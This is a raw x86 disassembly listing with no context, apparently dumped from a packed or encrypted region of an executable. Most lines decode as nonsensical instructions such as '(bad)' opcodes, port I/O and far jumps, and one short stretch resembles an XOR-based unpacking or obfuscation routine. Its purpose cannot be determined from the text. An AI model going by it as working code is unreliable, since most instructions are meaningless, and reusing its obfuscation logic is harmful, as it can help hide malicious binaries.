  41c4a2:	sub    al,0x86
  41c4a4:	(bad)  
  41c4a5:	sub    eax,DWORD PTR fs:[edx-0x49846dcf]
  41c4ac:	outs   dx,BYTE PTR ds:[esi]
  41c4ad:	push   esp
  41c4ae:	into   
  41c4af:	inc    ecx
  41c4b0:	mov    esi,0x1e08cd79
  41c4b5:	add    BYTE PTR [edi-0x18],ah
  41c4b8:	jmp    0x9bfd6c03
  41c4bd:	sbb    eax,ebx
  41c4bf:	call   0xa1:0xd3a92729
  41c4c6:	fld    DWORD PTR [edx]
  41c4c8:	push   esi
  41c4c9:	stc    
  41c4ca:	aaa    
  41c4cb:	pop    edi
  41c4cc:	pop    esi
  41c4cd:	test   DWORD PTR [edx+0x8],edi
  41c4d0:	bound  esp,QWORD PTR [ebx]
  41c4d2:	loope  0x41c54c
  41c4d4:	dec    ebp
  41c4d5:	scas   eax,DWORD PTR es:[edi]
  41c4d6:	adc    al,0x2b
  41c4d8:	cwde   
  41c4d9:	push   esp
  41c4da:	xchg   DWORD PTR [ebp-0x45a2cf21],edx
  41c4e0:	pop    es
  41c4e1:	mov    ?,WORD PTR [ecx]
  41c4e3:	out    0xba,al
  41c4e5:	and    ch,dl
  41c4e7:	stos   DWORD PTR es:[edi],eax
  41c4e8:	jbe    0x41c476
  41c4ea:	stos   DWORD PTR es:[edi],eax
  41c4eb:	cmp    dh,dh
  41c4ed:	ret    0x7df9
  41c4f0:	test   DWORD PTR [edi],ebp
  41c4f2:	xchg   ebp,eax
  41c4f3:	cmp    DWORD PTR [edi],0x1360dd81
  41c4f9:	in     al,dx
  41c4fa:	outs   dx,BYTE PTR ds:[esi]
  41c4fb:	xor    al,0x25
  41c4fd:	xchg   edi,eax
  41c4fe:	fs cmc 
  41c500:	cmp    BYTE PTR [esi-0x67b6ee4f],0x37
  41c507:	xor    al,BYTE PTR [ecx-0x1e536937]
  41c50d:	push   ebp
  41c50e:	xor    DWORD PTR es:[esi-0x16],esp
  41c512:	aam    0x41
  41c514:	push   edx
  41c515:	and    ebx,esp
  41c517:	jmp    0xe81a:0xdcedf4d5
  41c51e:	inc    edi
  41c51f:	dec    esp
  41c520:	es repnz dec edx
  41c523:	out    dx,al
  41c524:	jl     0x41c4cf
  41c526:	fidivr DWORD PTR [edi]
  41c528:	jmp    0xa94d:0x2f54c836
  41c52f:	mov    BYTE PTR [edx-0x36f61366],bl
  41c535:	dec    ecx
  41c536:	daa    
  41c537:	mov    al,ds:0x7d13215c
  41c53c:	jg     0x41c524
  41c53e:	xor    ch,ah
  41c540:	in     eax,dx
  41c541:	mov    al,ds:0x3c949513
  41c546:	(bad)  
  41c547:	mov    ?,WORD PTR ss:[ecx]
  41c54a:	mov    edi,?
  41c54c:	xlat   BYTE PTR ds:[ebx]
  41c54d:	idiv   BYTE PTR [ecx-0x42a9b428]
  41c553:	clc    
  41c554:	call   0xf464:0x584f5ff
  41c55b:	inc    ebx
  41c55c:	or     BYTE PTR [ebx+0x35555fb9],0xaa
  41c563:	mov    eax,0x8cb35e4f
  41c568:	xor    eax,0x880bae2b
  41c56d:	out    0x74,eax
  41c56f:	push   esi
  41c570:	or     bh,bh
  41c572:	imul   ebp,DWORD PTR [ecx+0x4c206c20],0x8e267f09
  41c57c:	ins    BYTE PTR es:[edi],dx
  41c57d:	pop    ds
  41c57e:	mov    edi,0x612d9c92
  41c583:	xor    ecx,eax
  41c585:	xor    edx,eax
  41c587:	sub    ecx,edx
  41c589:	sub    ecx,esi
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	fcmovnb st,st(6)
  41c5d2:	xor    DWORD PTR [esi+edi*8+0xa7a7de1],esp
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	ret    
  41c5dd:	xchg   ecx,eax
  41c5de:	hlt    
  41c5df:	scas   eax,DWORD PTR es:[edi]
  41c5e0:	jecxz  0x41c610
  41c5e2:	call   0xd136:0x39d87cc6
  41c5e9:	mov    esi,0x1642c744
  41c5ee:	jle    0x41c605
  41c5f0:	xor    BYTE PTR [eax+0x73],cl
  41c5f3:	push   esi
  41c5f4:	into   
  41c5f5:	in     al,0x4f
  41c5f7:	repz xchg esp,eax
  41c5f9:	push   ds
  41c5fa:	sahf   
  41c5fb:	sbb    BYTE PTR [edi],dh
  41c5fd:	push   edx
  41c5fe:	push   ecx
  41c5ff:	cmp    cl,ch
  41c601:	pop    ecx
  41c602:	leave  
  41c603:	push   edx
  41c604:	clc    
  41c605:	loop   0x41c59f
  41c607:	frstor [esi+0x49ada55a]
  41c60d:	(bad)  
  41c60e:	sub    ecx,eax
  41c610:	retf   0xbc56
  41c613:	inc    edi
  41c614:	or     BYTE PTR [esi+ebx*8+0x58],cl
  41c618:	mov    ah,0xd6
  41c61a:	aas    
  41c61b:	(bad)  [ecx+0x73]
  41c61e:	or     DWORD PTR ds:0xaa3b953f,esp
  41c624:	jge    0x41c680
  41c626:	jae    0x41c67e
  41c628:	jnp    0x41c5e8
  41c62a:	out    dx,eax
  41c62b:	out    dx,al
  41c62c:	hlt    
  41c62d:	dec    ebx
  41c62e:	fs jne 0x41c672
  41c631:	ror    BYTE PTR [ebp+0x26161119],0xf3
  41c638:	fucomip st,st(6)
  41c63a:	sub    DWORD PTR [ecx-0x3dd7bd82],ebx
  41c640:	repnz sub eax,DWORD PTR [ecx-0x15f1ec9c]
  41c647:	dec    edi
  41c648:	push   eax
  41c649:	jmp    0x41c5cd
  41c64b:	ss jne 0x41c6b2
  41c64e:	jmp    0x41c699
  41c650:	xor    edi,DWORD PTR [eax+eax*4-0x55]
  41c654:	xor    DWORD PTR [edx+0x34],esi
  41c657:	lods   eax,DWORD PTR ds:[esi]
  41c658:	mov    ch,0x84
  41c65a:	mov    ch,0x16
  41c65c:	bound  edi,QWORD PTR [ecx+0x48]
  41c65f:	out    0xc9,eax
  41c661:	dec    edi
  41c662:	and    DWORD PTR [ebx],ecx
  41c664:	jg     0x41c60e
  41c666:	pop    ecx
  41c667:	fcmovnbe st,st(5)
  41c669:	test   BYTE PTR [esi-0x31a9bd78],bh
  41c66f:	je     0x41c695
  41c671:	cld    
  41c672:	xchg   BYTE PTR [ebx],bl
  41c674:	and    al,0x9a
  41c676:	dec    eax
  41c677:	into   
  41c678:	jp     0x41c6a6
  41c67a:	cmp    BYTE PTR [esi-0x5ba25dab],al
  41c680:	test   BYTE PTR [edi+eax*8-0x5b348d9f],ah
  41c687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c688:	xchg   ebp,eax
  41c689:	(bad)  [edi+0x2963e3bd]
  41c68f:	push   cs
  41c690:	adc    eax,ebx
  41c692:	dec    edx
  41c693:	repnz and eax,0x9acc43fc
  41c699:	and    BYTE PTR [ebx],bl
  41c69b:	mov    eax,0x9485bb6e
  41c6a0:	mov    ch,0xd4
  41c6a2:	test   DWORD PTR cs:[edi-0x21722651],esp
  41c6a9:	mov    al,ds:0x3a382e4b
  41c6ae:	cmp    BYTE PTR [ecx+edi*1+0x19c0fed9],bl
  41c6b5:	rdtsc  
  41c6b7:	mov    fs,WORD PTR [ebx]
  41c6b9:	fmul   DWORD PTR [ebp-0x5d55fd63]
  41c6bf:	mov    eax,ds:0xc676d216
  41c6c4:	lea    esi,[ecx-0x356afc31]
  41c6ca:	lods   eax,DWORD PTR ds:[esi]
  41c6cb:	mov    dl,0x16
  41c6cd:	retf   
  41c6ce:	call   0x5b7eecc5
  41c6d3:	loope  0x41c733
  41c6d5:	call   0x11a6:0xeee33ac9
  41c6dc:	inc    ecx
  41c6dd:	mov    es,ebp
  41c6df:	bound  eax,QWORD PTR [ebx+esi*8+0x15]
  41c6e3:	(bad)  
  41c6e5:	and    eax,0xd3934fe4
  41c6ea:	mov    bh,0x3a
  41c6ec:	sar    DWORD PTR [edi+0x74],1
  41c6ef:	mov    cl,0xc4
  41c6f1:	fwait
  41c6f2:	icebp  
  41c6f3:	pop    ecx
  41c6f4:	fld    DWORD PTR [esi+0xf]
  41c6f7:	xchg   ebx,eax
  41c6f8:	add    ecx,DWORD PTR [esi]
  41c6fa:	iret   
  41c6fb:	jecxz  0x41c6cf
  41c6fd:	test   al,dh
  41c6ff:	lock test DWORD PTR [esi],edx
  41c702:	xor    al,0xe8
  41c704:	call   DWORD PTR [esi]
  41c706:	mov    ch,0x6
  41c708:	outs   dx,BYTE PTR gs:[si]
  41c70b:	das    
  41c70c:	dec    ebx
  41c70d:	dec    ebp
  41c70e:	clc    
  41c70f:	inc    esi
  41c710:	repz neg BYTE PTR [ebx-0x76]
  41c714:	jb     0x41c717
  41c716:	mov    eax,ds:0x21f766c9
  41c71b:	fcom   DWORD PTR [ecx]
  41c71d:	in     eax,dx
  41c71e:	jbe    0x41c785
  41c720:	repz and BYTE PTR [edi-0x6e7d2033],bh
  41c727:	int3   
  41c728:	sub    bh,ah
  41c72a:	lds    eax,FWORD PTR [esi+0x769c61d8]
  41c730:	jmp    0x41c749
  41c732:	clc    
  41c733:	push   esi
  41c734:	inc    esi
  41c735:	xchg   dl,dh
  41c737:	or     BYTE PTR [edx+edx*4],al
  41c73a:	lds    ebp,FWORD PTR [edx]
  41c73c:	arpl   WORD PTR [eax+0x4cf49b],si
  41c742:	add    DWORD PTR [esi+ecx*8-0x4f61b554],edx
  41c749:	popa   
  41c74a:	ds jge 0x41c72c
  41c74d:	loope  0x41c758
  41c74f:	je     0x41c78b
  41c751:	pop    edi
  41c752:	adc    BYTE PTR [eax],dl
  41c754:	cmp    dl,ah
  41c756:	sar    ebp,1
  41c758:	push   esp
  41c759:	xchg   BYTE PTR gs:[ebx+0xd9e741c],al
  41c760:	fwait
  41c761:	mov    al,ds:0x84b726d0
  41c766:	fwait
  41c767:	or     eax,ebx
  41c769:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c76a:	or     esp,0xa6f3b505
  41c770:	stos   BYTE PTR es:[edi],al
  41c771:	in     eax,0x2a
  41c773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c774:	mov    DWORD PTR [eax],ecx
  41c776:	xchg   ebp,eax
  41c777:	mov    ebx,es
  41c779:	xor    DWORD PTR [ecx],eax
  41c77b:	gs nop
  41c77d:	outs   dx,BYTE PTR ds:[esi]
  41c77e:	retf   0xcfbe
  41c781:	mov    esi,0xd35838d1
  41c786:	fwait
  41c787:	mov    dh,0x73
  41c789:	(bad)  
  41c78a:	je     0x41c76f
  41c78c:	je     0x41c7e5
  41c78e:	cmc    
  41c78f:	leave  
  41c790:	and    bh,BYTE PTR [ecx+edi*1-0x4ad24cdf]
  41c797:	push   ecx
  41c798:	ret    0xb990
  41c79b:	pop    ecx
  41c79c:	dec    eax
  41c79d:	lds    edx,FWORD PTR [ebx-0x32]
  41c7a0:	adc    esi,DWORD PTR [edi-0x95039ce]
  41c7a6:	pop    ebx
  41c7a7:	mov    ebx,0x4c3d5a15
  41c7ac:	cmc    
  41c7ad:	add    al,BYTE PTR [ecx-0x54]
  41c7b0:	jo     0x41c733
  41c7b2:	cmp    edx,DWORD PTR [ecx+eax*8-0x15a702c4]
  41c7b9:	and    BYTE PTR [esi],0xee
  41c7bc:	or     al,0xb7
  41c7be:	add    al,0x5b
  41c7c0:	stc    
  41c7c1:	mul    esp
  41c7c3:	in     al,dx
  41c7c4:	rcr    BYTE PTR [edi],1
  41c7c6:	repnz push edi
  41c7c8:	lds    ebx,FWORD PTR [esi]
  41c7ca:	inc    eax
  41c7cb:	mov    eax,0xe0e853e9
  41c7d0:	sbb    bl,dh
  41c7d2:	add    eax,0x409f8fa6
  41c7d7:	ret    0x86f2
  41c7da:	in     eax,dx
  41c7db:	and    dl,BYTE PTR [ecx]
  41c7dd:	in     eax,0x7f
  41c7df:	fsub   QWORD PTR [edi-0x2656d738]
  41c7e5:	mov    al,0x47
  41c7e7:	enter  0x71be,0xe3
  41c7eb:	or     al,ah
  41c7ed:	lods   al,BYTE PTR ds:[esi]
  41c7ee:	loopne 0x41c7ae
  41c7f0:	xor    al,0x3f
  41c7f2:	push   es
  41c7f3:	pop    esi
  41c7f4:	cli    
  41c7f5:	xchg   esp,eax
  41c7f6:	mov    al,ds:0x4fa8b9fc
  41c7fb:	rol    DWORD PTR [ebp+0x753610c2],0xd5
  41c802:	retf   
  41c803:	xchg   edi,eax
  41c804:	aad    0x6d
  41c806:	xchg   edx,eax
  41c807:	mov    ds:0x342e0c49,eax
  41c80c:	int3   
  41c80d:	outs   dx,BYTE PTR ds:[esi]
  41c80e:	int    0x80
  41c810:	xor    ch,BYTE PTR [edx-0x7feaf6e8]
  41c816:	jns    0x41c7ee
  41c818:	mov    cl,0x7d
  41c81a:	scas   ax,WORD PTR es:[edi]
  41c81c:	cmp    edi,DWORD PTR [esi+0x16ea838e]
  41c822:	(bad)  
  41c823:	dec    esp
  41c824:	les    ebx,FWORD PTR [ebp+esi*2-0x22]
  41c828:	xchg   ebx,eax
  41c829:	cmp    BYTE PTR [ecx],al
  41c82b:	mov    eax,0x1f8613d9
  41c830:	sbb    DWORD PTR [ebx+0x55],edx
  41c833:	add    edi,DWORD PTR [ecx+0x53]
  41c836:	xor    bl,BYTE PTR [edi]
  41c838:	sub    bl,ah
  41c83a:	inc    ebx
  41c83b:	fcomp  QWORD PTR [edx+0x43]
  41c83e:	retf   
  41c83f:	or     BYTE PTR [ebx],bh
  41c841:	jp     0x41c819
  41c843:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c844:	pop    ebx
  41c845:	repz add ecx,ebx
  41c848:	and    edi,esi
  41c84a:	or     eax,DWORD PTR [ebx-0x78]
  41c84d:	or     eax,DWORD PTR [esi+0xf]
  41c850:	push   ss
  41c851:	mov    al,ds:0x9b1abb6
  41c856:	test   DWORD PTR cs:[edi+ebx*4],esp
  41c85a:	and    bl,BYTE PTR [ebx+0x298a847c]
  41c860:	clc    
  41c861:	(bad)  
  41c862:	sti    
  41c863:	stos   BYTE PTR es:[edi],al
  41c864:	ins    DWORD PTR es:[edi],dx
  41c865:	dec    esi
  41c866:	ror    BYTE PTR [ecx-0x73],cl
  41c869:	jo     0x41c813
  41c86b:	shl    BYTE PTR [ebx+ebx*2+0x8],cl
  41c86f:	mov    edx,0xad9054ca
  41c874:	sbb    al,0xe1
  41c876:	pop    ds
  41c877:	outs   dx,BYTE PTR ds:[esi]
  41c878:	xchg   esi,eax
  41c879:	pop    esi
  41c87a:	or     bl,cl
  41c87c:	mov    eax,ds:0xd435a23
  41c881:	sub    BYTE PTR [esi],ch
  41c883:	in     al,dx
  41c884:	push   edx
  41c885:	xchg   esp,eax
  41c886:	aad    0xa9
  41c888:	add    BYTE PTR [edi],dh
  41c88a:	pop    esp
  41c88b:	in     eax,0xae
  41c88d:	repz fsub DWORD PTR [edx+0x3245d6ca]
  41c894:	ror    bh,0xa9
  41c897:	sub    eax,0x17753042
  41c89c:	and    edx,DWORD PTR [edi+0x6de3d704]
  41c8a2:	cmp    al,0x76
  41c8a4:	dec    edi
  41c8a5:	dec    esi
  41c8a6:	scas   eax,DWORD PTR es:[edi]
  41c8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a8:	inc    ebx
  41c8a9:	and    BYTE PTR [ecx+0x3ba66733],bh
  41c8af:	lods   al,BYTE PTR ds:[esi]
  41c8b0:	movups XMMWORD PTR [edx-0x51],xmm4
  41c8b4:	stos   BYTE PTR es:[edi],al
  41c8b5:	scas   al,BYTE PTR es:[edi]
  41c8b6:	sbb    eax,0xa88e800e
  41c8bb:	push   es
  41c8bc:	inc    eax
  41c8bd:	dec    edi
  41c8be:	jb     0x41c8f0
  41c8c0:	mov    bl,BYTE PTR [ebp-0x6276d411]
  41c8c6:	xor    al,0xde
  41c8c8:	add    eax,0x4f14c097
  41c8cd:	mov    DWORD PTR [eax-0x2b364af7],edx
  41c8d3:	add    dh,al
  41c8d5:	add    DWORD PTR ds:0x6ac81cbe,eax
  41c8db:	mov    esp,cs
  41c8dd:	sub    esp,DWORD PTR [ecx]
  41c8df:	jle    0x41c884
  41c8e1:	mov    ds:0x2f7cffbb,eax
  41c8e6:	dec    ebx
  41c8e7:	cmp    eax,0x2f4f077b
  41c8ec:	pop    esp
  41c8ed:	clc    
  41c8ee:	jns    0x41c944
  41c8f0:	or     cl,BYTE PTR [ecx-0x74]
  41c8f3:	add    esp,DWORD PTR ds:0x462eb695
  41c8f9:	jo     0x41c95f
  41c8fb:	xor    ah,cl
  41c8fd:	jo     0x41c91f
  41c8ff:	ror    DWORD PTR [ebx-0x38],1
  41c902:	repnz mov WORD PTR [esi],ss
  41c905:	jnp    0x41c97c
  41c907:	in     al,0xb7
  41c909:	pop    edi
  41c90a:	add    eax,0x2aee5066
  41c90f:	(bad)  
  41c910:	sbb    DWORD PTR [edi],ebp
  41c912:	ins    BYTE PTR es:[edi],dx
  41c913:	lods   eax,DWORD PTR ds:[esi]
  41c914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c915:	cmp    DWORD PTR [ecx+eax*4+0x4e00f06e],esp
  41c91c:	int    0xda
  41c91e:	fwait
  41c91f:	adc    BYTE PTR gs:[eax-0xf],bh
  41c923:	sub    DWORD PTR [ebx+ebx*8-0x5fe4c789],edx
  41c92a:	dec    eax
  41c92b:	jno    0x41c988
  41c92d:	sahf   
  41c92e:	or     BYTE PTR ds:0x72649833,ch
  41c934:	pop    edx
  41c935:	push   esi
  41c936:	fmul   QWORD PTR [eax+0x70d7fd66]
  41c93c:	xchg   ecx,eax
  41c93d:	and    eax,0x5f84cc22
  41c942:	adc    ecx,DWORD PTR [ecx+0x65]
  41c945:	push   0xeed67068
  41c94a:	dec    ebx
  41c94b:	aad    0xef
  41c94d:	push   ebp
  41c94e:	sub    ah,dh
  41c950:	cmp    al,0x2c
  41c952:	hlt    
  41c953:	add    BYTE PTR [esi+0x32],dl
  41c956:	into   
  41c957:	loope  0x41c9b1
  41c959:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c95b:	lods   al,BYTE PTR ds:[esi]
  41c95c:	dec    eax
  41c95d:	lods   al,BYTE PTR ds:[esi]
  41c95e:	lahf   
  41c95f:	or     BYTE PTR [esi-0x64616512],ch
  41c965:	xchg   edi,eax
  41c966:	pop    eax
  41c967:	jp     0x41c9c0
  41c969:	stos   BYTE PTR es:[edi],al
  41c96a:	inc    edx
  41c96b:	jnp    0x41c986
  41c96d:	loop   0x41c8f9
  41c96f:	ficomp DWORD PTR [esi]
  41c971:	mov    ds:0xb25c2b76,al
  41c976:	adc    eax,0x6d2e5e6
  41c97b:	fstp   TBYTE PTR [edx+0x1896a42e]
  41c981:	xchg   edx,esp
  41c983:	dec    ebx
  41c984:	mov    bl,dl
  41c986:	xlat   BYTE PTR ds:[ebx]
  41c987:	lds    ebp,FWORD PTR [edx]
  41c989:	outs   dx,BYTE PTR ds:[esi]
  41c98a:	xchg   ebx,eax
  41c98b:	dec    ecx
  41c98c:	outs   dx,BYTE PTR ds:[esi]
  41c98d:	lea    esi,[esi+ecx*1]
  41c990:	add    al,0x61
  41c992:	xchg   edi,eax
  41c993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c994:	mov    bl,BYTE PTR [eax+eax*8]
  41c997:	aam    0x7c
  41c999:	mov    eax,ds:0xdfeabafa
  41c99e:	lock loopne 0x41c9d0
  41c9a1:	das    
  41c9a2:	stos   BYTE PTR es:[edi],al
  41c9a3:	daa    
  41c9a4:	xchg   ebx,eax
  41c9a5:	mov    ch,0x9d
  41c9a7:	add    bh,dh
  41c9a9:	pop    ebp
  41c9aa:	and    BYTE PTR ds:0xa9d2ec72,bl
  41c9b0:	rol    ebx,cl
  41c9b2:	xor    eax,0x91a40eac
  41c9b7:	jmp    0x5151e87c
  41c9bc:	pop    esp
  41c9bd:	mov    eax,0xf75cec4c
  41c9c2:	dec    ebp
  41c9c3:	cmp    eax,0x24ff5a8f
  41c9c8:	iret   
  41c9c9:	ret    0x9937
  41c9cc:	ds loop 0x41ca37
  41c9cf:	add    ah,bl
  41c9d1:	scas   al,BYTE PTR es:[edi]
  41c9d2:	(bad)  
  41c9d4:	jmp    0xbf25:0xcf667561
  41c9db:	lds    edx,FWORD PTR [ecx+eiz*2]
  41c9de:	ds jne 0x41ca45
  41c9e1:	jg     0x41ca23
  41c9e3:	sahf   
  41c9e4:	in     eax,dx
  41c9e5:	dec    esi
  41c9e6:	loopne 0x41c9d3
  41c9e8:	aaa    
  41c9e9:	out    dx,al
  41c9ea:	jbe    0x41ca02
  41c9ec:	arpl   WORD PTR ds:0xdfc1a3fe,bx
  41c9f2:	inc    edi
  41c9f3:	cld    
  41c9f4:	add    bl,al
  41c9f6:	or     bh,ah
  41c9f8:	(bad)  
  41c9f9:	stc    
  41c9fa:	cs inc esp
  41c9fc:	pop    es
  41c9fd:	sti    
  41c9fe:	out    dx,eax
  41c9ff:	sahf   
  41ca00:	mov    BYTE PTR [esi+0x43e14aec],bh
  41ca06:	mov    esp,0x28af152d
  41ca0b:	frstor [eax]
  41ca0d:	sbb    bh,cl
  41ca0f:	xchg   edi,eax
  41ca10:	loope  0x41ca15
  41ca12:	mov    eax,ds:0xbb447a19
  41ca17:	popa   
  41ca18:	pop    ebx
  41ca19:	outs   dx,BYTE PTR ds:[esi]
  41ca1a:	pop    ebx
  41ca1b:	(bad)  
  41ca1c:	mov    al,0xbe
  41ca1e:	popa   
  41ca1f:	jp     0x41c9ef
  41ca21:	imul   esi,DWORD PTR [ebx+0x3b],0xffffff96
  41ca25:	out    dx,al
  41ca26:	mov    dl,0xa3
  41ca28:	or     BYTE PTR ds:0x81e790b8,bh
  41ca2e:	push   es
  41ca2f:	pop    ds
  41ca30:	sub    eax,0x1083f000
  41ca35:	jg     0x41ca21
  41ca37:	fdivr  DWORD PTR [ecx]
  41ca39:	cmp    al,0x1a
  41ca3b:	and    eax,DWORD PTR [edx+0x3c]
  41ca3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca3f:	inc    eax
  41ca40:	dec    edi
  41ca41:	add    al,0xf3
  41ca43:	or     ebp,DWORD PTR [ebp+edx*8-0x49f8ccf3]
  41ca4a:	mov    WORD PTR [ebx],fs
  41ca4c:	or     BYTE PTR [ebx],dl
  41ca4e:	fisttp WORD PTR [edx+esi*1]
  41ca51:	les    ecx,FWORD PTR [ebx+ebp*8+0x5fe80b9e]
  41ca58:	mov    ch,0xfd
  41ca5a:	sub    DWORD PTR [edi-0x29],0xa
  41ca5e:	cli    
  41ca5f:	push   edi
  41ca60:	and    eax,0x24c425c1
  41ca65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca66:	test   eax,0xf549df51
  41ca6b:	push   edi
  41ca6c:	sar    DWORD PTR [eax*1+0x13e6e864],0x33
  41ca74:	push   ds
  41ca75:	fwait
  41ca76:	sbb    eax,0x834f3807
  41ca7b:	addr16 adc eax,0xa27f7fe3
  41ca81:	ret    
  41ca82:	jae    0x41ca26
  41ca84:	and    bh,al
  41ca86:	push   0xffffffd1
  41ca88:	dec    ebp
  41ca89:	shr    BYTE PTR fs:[esi],1
  41ca8c:	pushf  
  41ca8d:	push   0x187ddc3c
  41ca92:	inc    ecx
  41ca93:	pop    es
  41ca94:	and    al,0x62
  41ca96:	mov    bh,0x58
  41ca98:	test   BYTE PTR [edi],cl
  41ca9a:	jno    0x41caea
  41ca9c:	loop   0x41cb0c
  41ca9e:	in     al,dx
  41ca9f:	and    BYTE PTR [edx],0x42
  41caa2:	dec    edi
  41caa3:	dec    ecx
  41caa4:	mov    ds:0x65148f57,eax
  41caa9:	jmp    FWORD PTR [esi+0x9da129]
  41caaf:	loope  0x41cb0f
  41cab1:	(bad)  
  41cab2:	jge    0x41cae0
  41cab4:	shl    BYTE PTR [esi-0x76580971],1
  41caba:	ret    0x53bd
  41cabd:	cmp    dh,BYTE PTR [ecx-0x995f16b]
  41cac3:	jp     0x41cad1
  41cac5:	bound  ebx,QWORD PTR [eax+0x645edcb0]
  41cacb:	into   
  41cacc:	jne    0x41cb0c
  41cace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cacf:	mov    ebx,0xa2b476d
  41cad4:	add    al,0xfd
  41cad6:	lds    ebp,FWORD PTR [eax]
  41cad8:	xor    BYTE PTR [esi-0x21],0x1f
  41cadc:	out    0x23,eax
  41cade:	jecxz  0x41ca7d
  41cae0:	fdiv   DWORD PTR [edi]
  41cae2:	xchg   edx,eax
  41cae3:	pop    eax
  41cae4:	inc    edi
  41cae5:	rcl    BYTE PTR [esi+0x18144d19],cl
  41caeb:	(bad)  
  41caed:	push   DWORD PTR [ecx+0x1a]
  41caf0:	gs stos DWORD PTR es:[edi],eax
  41caf2:	pop    edx
  41caf3:	inc    ebx
  41caf4:	jne    0x41caf0
  41caf6:	out    dx,al
  41caf7:	mov    BYTE PTR [ebx+0x1a0750d4],bl
  41cafd:	test   al,0xd0
  41caff:	lods   eax,DWORD PTR ds:[esi]
  41cb00:	dec    esi
  41cb01:	add    eax,0xf0dd9622
  41cb06:	addr16 pop edx
  41cb08:	mov    ebp,0xca32b1e6
  41cb0d:	pop    ecx
  41cb0e:	xor    esp,edi
  41cb10:	mov    BYTE PTR [edi-0x68188d74],ch
  41cb16:	retf   0x4143
  41cb19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb1a:	call   0x5768:0x20478976
  41cb21:	adc    eax,DWORD PTR ds:0xc26d4b67
  41cb27:	jp     0x41cadf
  41cb29:	xor    ah,BYTE PTR [edi+0x6c]
  41cb2c:	js     0x41cb77
  41cb2e:	arpl   bx,bx
  41cb30:	clc    
  41cb31:	out    dx,eax
  41cb32:	neg    BYTE PTR [esp+ebx*4+0x209c77c5]
  41cb39:	xor    ebp,DWORD PTR [ebx+0x73]
  41cb3c:	cmp    ebx,DWORD PTR [ebx+0x25b78526]
  41cb42:	hlt    
  41cb43:	hlt    
  41cb44:	mov    ch,0xa5
  41cb46:	pop    eax
  41cb47:	loop   0x41cb4f
  41cb49:	(bad)  
  41cb4a:	outs   dx,BYTE PTR ds:[esi]
  41cb4b:	gs in  eax,dx
  41cb4d:	jo     0x41cbb3
  41cb4f:	pusha  
  41cb50:	shr    DWORD PTR [edx-0x5a],cl
  41cb53:	jge    0x41cb90
  41cb55:	jnp    0x41cb96
  41cb57:	pop    ecx
  41cb58:	add    esi,DWORD PTR [edx+0x17]
  41cb5b:	out    0xdd,al
  41cb5d:	fwait
  41cb5e:	jp     0x41cbde
  41cb60:	jno    0x41cbbc
  41cb62:	or     DWORD PTR [ebx],eax
  41cb64:	push   ecx
  41cb65:	(bad)  
  41cb67:	inc    esi
  41cb68:	push   eax
  41cb69:	aam    0x32
  41cb6b:	sbb    al,0x16
  41cb6d:	dec    ebp
  41cb6e:	int    0xd1
  41cb70:	ja     0xc5ac6c8a
  41cb76:	dec    esp
  41cb77:	fdivr  QWORD PTR [edx+0x6c529fa1]
  41cb7d:	mov    ebx,0x77820aa8
  41cb82:	bound  ecx,QWORD PTR [ebp+0xb]
  41cb85:	ja     0x41cb4e
  41cb87:	lods   eax,DWORD PTR ds:[esi]
  41cb88:	leave  
  41cb89:	clc    
  41cb8a:	addr16 inc ebx
  41cb8c:	dec    ecx
  41cb8d:	div    DWORD PTR [edi+0x3966044c]
  41cb93:	popf   
  41cb94:	mov    es,WORD PTR [edx]
  41cb96:	cs out dx,al
  41cb98:	jg     0x41cbc9
  41cb9a:	jno    0x41cba3
  41cb9c:	(bad)  
  41cb9d:	imul   edx,DWORD PTR [edi+0x46160125],0xbd0aec53
  41cba7:	into   
  41cba8:	jno    0x41cb7c
  41cbaa:	out    0x8a,al
  41cbac:	xor    eax,0xf4e79357
  41cbb1:	push   es
  41cbb2:	push   ebx
  41cbb3:	push   cs
  41cbb4:	xchg   ecx,eax
  41cbb5:	call   0x33299faf
  41cbba:	pop    es
  41cbbb:	add    BYTE PTR [ebx-0x2d11fe9d],dh
  41cbc1:	jmp    0x41cc1e
  41cbc3:	or     eax,0x419e4ab9
  41cbc8:	pop    esi
  41cbc9:	mov    ebp,0x353b6d6c
  41cbce:	in     al,dx
  41cbcf:	mov    ebp,0x95172cb3
  41cbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbd5:	add    cl,BYTE PTR [edx-0x103940a]
  41cbdb:	cli    
  41cbdc:	in     eax,0xe4
  41cbde:	push   edi
  41cbdf:	sbb    DWORD PTR [eax-0x210ffa8a],esp
  41cbe5:	jns    0x41cc5c
  41cbe7:	jge    0x41cc28
  41cbe9:	xchg   ecx,eax
